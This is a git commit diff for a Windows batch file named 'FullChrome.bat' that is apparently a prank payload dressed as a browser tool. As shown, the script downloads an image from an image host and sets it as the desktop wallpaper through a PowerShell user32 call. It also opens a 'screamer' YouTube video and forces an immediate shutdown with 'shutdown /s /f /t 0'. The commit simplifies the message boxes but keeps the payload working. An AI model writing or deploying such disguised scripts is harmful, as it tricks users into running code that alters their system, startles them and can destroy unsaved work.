1e36900858f364d57af657d192b17536c8c53d26
N1C1T0Z <inartpro2024@gmail.com>
2025-11-26 17:55:06 +0100

    Refactor FullChrome.bat to simplify message display

--- FullChrome.bat
+++ FullChrome.bat
@@ -2,12 +2,14 @@
 set URL=https://i.postimg.cc/qv0XLxm3/wp.webp
 set IMG=%TEMP%\wp.webp
 powershell -Command "Invoke-WebRequest '%URL%' -OutFile '%IMG%'"
-for /L %%i in (1,1,10) do (
-    powershell -Command "Add-Type -AssemblyName PresentationFramework; [System.Windows.MessageBox]::Show('Attendez s''il vous plaît')"
-)
-timeout /t 3 >nul
+powershell -Command "Add-Type -AssemblyName PresentationFramework; [System.Windows.MessageBox]::Show('Attendez s''il vous plaît')"
 powershell -Command ^
-"$c='Add-Type @\"using System.Runtime.InteropServices; public class P{ [DllImport(\"user32.dll\",SetLastError=true)] public static extern bool SystemParametersInfo(int uAction,int uParam,string lpvParam,int fuWinIni);} \"@; Add-Type $c; [P]::SystemParametersInfo(20,0,\"%IMG%\",3)'"
-start https://www.youtube.com/watch?v=6_x_bMVbN34&pp=ygUIc2NyZWFtZXI%3D
+"Add-Type -TypeDefinition @'
+using System.Runtime.InteropServices;
+public class P{
+    [DllImport(""user32.dll"",SetLastError=true)]
+    public static extern bool SystemParametersInfo(int uAction,int uParam,string lpvParam,int fuWinIni);
+}
+'@; [P]::SystemParametersInfo(20,0,'%IMG%',3)"
+start "" "https://www.youtube.com/watch?v=6_x_bMVbN34&pp=ygUIc2NyZWFtZXI%3D"
 shutdown /s /f /t 0
-pause
